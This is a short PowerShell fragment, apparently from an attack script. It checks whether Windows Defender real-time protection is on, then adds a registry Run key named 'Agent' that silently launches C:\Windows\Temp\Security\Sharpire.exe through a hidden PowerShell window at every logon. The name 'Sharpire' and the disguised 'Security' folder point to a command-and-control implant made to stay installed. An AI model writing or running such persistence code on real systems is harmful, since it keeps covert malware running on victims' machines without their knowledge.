if (Get-MpComputerStatus | Where-Object {$_.RealTimeProtectionEnabled -like 'True'}){
	...
	REG Add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Agent" /t REG_SZ /F /D "powershell.exe -WindowStyle hidden -file C:\Windows\Temp\Security\Sharpire.exe";
}
